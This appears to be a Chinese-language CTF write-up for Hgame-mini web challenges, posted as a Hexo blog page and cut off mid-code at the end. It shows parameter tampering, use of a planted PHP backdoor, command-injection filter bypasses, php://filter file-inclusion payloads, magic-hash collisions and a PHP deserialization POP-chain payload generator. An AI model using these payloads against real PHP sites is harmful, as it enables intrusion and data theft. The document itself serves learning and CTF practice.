@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Hgame-mini Web-writeupsGet Post Universe打开页面是这样的:  页面提示看起来好像需要我们GET一个参数money,它的值为10000. 我们直接在url中构造get传参.在靶机url后输入?money&#x3D;10000,出现如下界面:  看起来还需要我们post一个参数card_id,它的值为7890234. 可以用burp传,也可以用各大语言的库构造一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2023/10/19/Hgame-mini%20Web-writeups/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hgame-mini Web-writeupsGet Post Universe打开页面是这样的:  页面提示看起来好像需要我们GET一个参数money,它的值为10000. 我们直接在url中构造get传参.在靶机url后输入?money&#x3D;10000,出现如下界面:  看起来还需要我们post一个参数card_id,它的值为7890234. 可以用burp传,也可以用各大语言的库构造一">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\GPU-1.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\GPU-2.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\GPU-3.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\tutu_shop_1.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\tutu_shop_2.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\tutu_shop_3.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\tutu_shop_4.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\tutu_shop_5.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sword_1.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sword_2.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sword_3.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sword_4.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sword_5.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sword_6.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sword_7.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\figlet_2.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\figlet_3.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\figlet_1.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\notebook_1.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\notebook_2.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\page.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\sourcecode.png">
+<meta property="article:published_time" content="2023-10-19T12:24:30.915Z">
+<meta property="article:modified_time" content="2023-10-16T13:54:58.565Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\GPU-1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Hgame-mini Web-writeups" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/10/19/Hgame-mini%20Web-writeups/" class="article-date">
+  <time class="dt-published" datetime="2023-10-19T12:24:30.915Z" itemprop="datePublished">2023-10-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Hgame-mini-Web-writeups"><a href="#Hgame-mini-Web-writeups" class="headerlink" title="Hgame-mini Web-writeups"></a>Hgame-mini Web-writeups</h1><h3 id="Get-Post-Universe"><a href="#Get-Post-Universe" class="headerlink" title="Get Post Universe"></a>Get Post Universe</h3><p>打开页面是这样的:</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\GPU-1.png"></p>
+<p>页面提示看起来好像需要我们GET一个参数money,它的值为10000.</p>
+<p>我们直接在url中构造get传参.在靶机url后输入?money&#x3D;10000,出现如下界面:</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\GPU-2.png"></p>
+<p>看起来还需要我们post一个参数<code>card_id</code>,它的值为7890234.</p>
+<p>可以用burp传,也可以用各大语言的库构造一个代码来实现.</p>
+<p>最近在学PHP,整了一个玩玩:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 目标 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://1.container.jingsai.apicon.cn:31406/?money=10000&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST 数据</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;card_id&#x27;</span> =&gt; <span class="string">&#x27;7890234&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 HTTP 上下文</span></span><br><span class="line"><span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span> =&gt; <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>),</span><br><span class="line">    ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送 POST 请求</span></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出返回内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Response Content:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>返回下图的数据,拿到flag.</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\GPU-3.png"></p>
+<p><strong>flag</strong>:<code>VIDAR&#123;N0w_Y0u_hav5_LearNed_AB0u7_GET_4nD_POST!!!&#125;</code></p>
+<h3 id="TuTu’s-shop"><a href="#TuTu’s-shop" class="headerlink" title="TuTu’s shop"></a>TuTu’s shop</h3><p>打开靶机,提示如图</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\tutu_shop_1.png"></p>
+<p>随便拉拉试试</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\tutu_shop_2.png" alt="tutu_shop_2"></p>
+<p>不行,抓个包看看<img src="C:\Users\24993\Desktop\博客文章\static\tutu_shop_3.png" alt="tutu_shop_3"></p>
+<p>burp改个包,全买了<img src="C:\Users\24993\Desktop\博客文章\static\tutu_shop_4.png" alt="tutu_shop_4"></p>
+<p>ez</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\tutu_shop_5.png" alt="tutu_shop_5"></p>
+<p>flag:<code>VIDAR&#123;3a2633da80483d3995317fb5f837b01174e628ed&#125;</code></p>
+<h3 id="The-Knife"><a href="#The-Knife" class="headerlink" title="The Knife"></a>The Knife</h3><p>打开页面,如图所示</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sword_1.png"></p>
+<p>查看页面源代码:</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sword_2.png" alt="sword_2"></p>
+<p>使用御剑目录扫描工具,得知文件存在后门php-backdoor.php</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sword_3.png" alt="sword_3"></p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sword_4.png" alt="sword_4"></p>
+<p>使用中国蚁剑工具进行连接,获取到对应服务器的操作权限</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sword_5.png"></p>
+<p>查看根目录,发现flag</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sword_6.png" alt="sword_6"></p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sword_7.png" alt="sword_7"></p>
+<p>flag:<code>VIDAR&#123;G5T_the_dir!H4cKTH3bacKdOOR_You_Get_The_Sh5LL!!!!&#125;</code></p>
+<h3 id="Fatal-Command"><a href="#Fatal-Command" class="headerlink" title="Fatal Command"></a>Fatal Command</h3><p>打开页面显示如下:</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\figlet_2.png"></p>
+<p>figlet是一个可以把输入转换成ascii艺术字的库</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\figlet_3.png"></p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\figlet_1.png" alt="figlet_3"></p>
+<p>这里实际上执行的语句是<code>cat /flag</code>,即从根目录查找flag</p>
+<p>直接输入指令会被过滤显示give up,所以我们需要利用一些命令绕过的知识,例如利用<code>$1</code>分割敏感词,利用<code>$&#123;IFS&#125;</code>绕过空格等等.</p>
+<p>flag:<code>VIDAR&#123;C0mmand_1njection_1s^sO0O_inter3st1n5~!&#125;</code></p>
+<h3 id="My-Notebook"><a href="#My-Notebook" class="headerlink" title="My Notebook"></a>My Notebook</h3><p>打开靶机页面显示如图</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\notebook_1.png"></p>
+<p>查看源代码,我们发现了一些提示:</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\notebook_2.png" alt="notebook_2"></p>
+<p>输入&#96;&#x2F;<a target="_blank" rel="noopener" href="http://www.zip,我们获得了页面源码/">www.zip,我们获得了页面源码</a></p>
+<p>其中有用的几个代码:</p>
+<p>mainclass.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HereWeGo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//对象销毁时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">try</span>-&gt;<span class="title function_ invoke__">gogogo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GoGoGo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$go</span></span>)//对象创建时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go = <span class="variable">$go</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;go-&gt;web;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;<span class="comment">//定义一个Evil类，他有file，final两个属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$final</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//The flag is in /flag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/vidar/i&#x27;</span>,<span class="variable">$result</span>))&#123;<span class="comment">//有vidar就写hacker</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">final</span> = <span class="string">&quot;HACKER!!!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">final</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">final</span> = <span class="variable">$result</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">final</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用PHP弱类型碰撞:<strong>Checkcode1&#x3D;QNKCDZO,Checkcode2&#x3D;240610708</strong>成功进入第二步.</p>
+<p>可以看出,我们并不能直接读取flag的值,flag的值中包含了vidar这个字符串,会触发过滤规则.</p>
+<p>我们利用php伪协议对flag进行读取,令最终的file的值为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag</span></span><br></pre></td></tr></table></figure>
+
+<p>这样,我们就可以利用PHP伪协议读取flag了.当然,读取出来的是base64编码后的flag,再转码即可获得原flag.</p>
+<p>接下来是利用PHP反序列化漏洞来构造payload.</p>
+<p>在 PHP 中，<code>__get</code> 方法用于在访问一个对象的不可访问属性时触发,而<code>__call</code> 方法用于在尝试调用一个对象的不可访问方法时触发.我们需要按照pop链来构造一个有效的反序列payload.</p>
+<p>触发序列为_ _destruct()-&gt;</p>
+<p>构造如下PHP程序产生payload.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HereWeGo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go = <span class="keyword">new</span> <span class="title class_">GoGoGo</span>();</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GoGoGo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span>=<span class="keyword">new</span> <span class="title class_">HereWeGo</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;HereWeGo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;try&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;GoGoGo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;go&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">54</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>VIDAR&#123;Php,BeAwAre0FUnS@vE_uNsEr1al1z5=o==o=&#125;</code></p>
+<h3 id="Read-Something-Useful"><a href="#Read-Something-Useful" class="headerlink" title="Read Something Useful"></a>Read Something Useful</h3><p>查看靶机页面</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\page.png"></p>
+<p>查看页面源代码,文件包含漏洞</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\sourcecode.png"></p>
+<p><strong>payload:&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;emoji</strong></p>
+<p>emoji.php</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>It is so funny, isn&#x27;t it<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;width: 10%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;img/&lt;?php echo rand(1,10);?&gt;.gif&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload:&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;emoji&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</strong></p>
+<p>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;meta name=&quot;author&quot; content=&quot;R1esbyfe&quot;&gt;</span><br><span class="line">        &lt;meta name=&quot;keywords&quot; content=&quot;Challenge12&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">        &lt;div style=&quot;text-align: center&quot;&gt;</span><br><span class="line">            &lt;!-- try to read index.php first! --&gt;</span><br><span class="line">            &lt;h4&gt;Try to click the button to enjoy my emoji!!!&lt;/h4&gt;</span><br><span class="line">            &lt;form action=&quot;index.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;file&quot; id=&quot;file&quot; value=&quot;emoji&quot;&gt;</span><br><span class="line">                &lt;button type=&quot;submit&quot;&gt;Click me&lt;/button&gt;</span><br><span class="line">                &lt;!-- You may find it is a little difficult to read other files, right :( --&gt;</span><br><span class="line">                &lt;!-- in index.php:</span><br><span class="line"></span><br><span class="line">                    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">                    if(strpos($file, &quot;emoji&quot;) !== false)&#123;</span><br><span class="line">                    include($file.&#x27;.php&#x27;);</span><br><span class="line">                    &#125;</span><br><span class="line">                --&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(&#x27;blacklist.php&#x27;);</span><br><span class="line"></span><br><span class="line">//try to read findme.php to find my secrets :D</span><br><span class="line"></span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    foreach ($blacklist as $blacklistedWord) &#123;</span><br><span class="line">        if (preg_match(&#x27;/(?i)&#x27; . $blacklistedWord . &#x27;/&#x27;, $file)) &#123;</span><br><span class="line">            echo &quot;&lt;center&gt;nonono&lt;/center&gt;&quot;;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(strpos($file, &quot;emoji&quot;) !== false)&#123;</span><br><span class="line">        include($file.&#x27;.php&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;&lt;center&gt;No,You need to find another way to find my secret :(&lt;/center&gt;&quot;;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload:&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;emoji&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;findme</strong></p>
+<p>fineme.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;FLAG&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$lucky</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;luckynumber&#x27;</span>];</span><br><span class="line">    <span class="variable">$context</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;context&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$lucky</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$context</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$lucky</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Not a number&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="variable">$lucky</span> == <span class="number">777</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$context</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;humanoid&quot;</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Congratulations, the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">            